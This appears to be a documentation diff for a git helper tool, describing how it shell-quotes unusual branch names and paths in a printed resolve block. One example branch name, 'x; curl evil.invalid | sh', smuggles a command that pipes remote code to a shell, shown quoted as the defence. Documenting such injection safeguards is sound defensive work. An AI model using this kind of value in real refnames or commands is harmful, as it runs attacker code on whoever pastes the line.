@@ -105,6 +105,27 @@ The section therefore distinguishes three outcomes, which used to render identic
 
 The resolve commands print in all three cases; they never needed the hunks.
 
+**Branch names and paths in the resolve block are shell-quoted when they are not ordinary** ([#694](https://github.com/Digital-Process-Tools/claude-supertool/issues/694)). The source branch of a merge request is named by whoever opened it, and git refnames permit `;`, backtick, `$`, `&`, quotes, parentheses and spaces. Supertool does not run this block — it prints it for you or an agent to paste — but "paste this" is close enough to "run this" that the printed line has to be safe.
+
+A name matching `^[A-Za-z0-9._/-]+$` prints bare, so the ordinary block is unchanged:
+
+```
+To resolve:
+  git checkout feat/x && git fetch origin && git merge origin/master
+  git add a.py b.py && git commit && git push
+```
+
+Anything else is quoted, and a line above the block says so:
+
+```
+To resolve:
+  # ⚠ 2 names below contain characters a shell acts on, and have been quoted — read the command before running it.
+  git checkout 'x; curl evil.invalid | sh' && git fetch origin && git merge origin/master
+  git add 'a file.py' && git commit && git push
+```
+
+Option-shaped names (`-B`) are the limit of what quoting reaches: `git checkout '-B'` still reads a flag. They are quoted so they look wrong and named in the warning — git itself refuses to create such a refname, so one arriving from the API is worth stopping over.
+
 **The hunk timeout scales with the conflicted file count** — `max(15s, 5s × files)`, capped at 60s. Wall time here is git's merge computation, not the pipe write, so it tracks how many files git has to merge. 15s is a floor that is generous for one conflicted text file and thin for a dozen files or a cold object cache — which is where the preview is worth the most.
 
 **Debug a failed pipeline:**
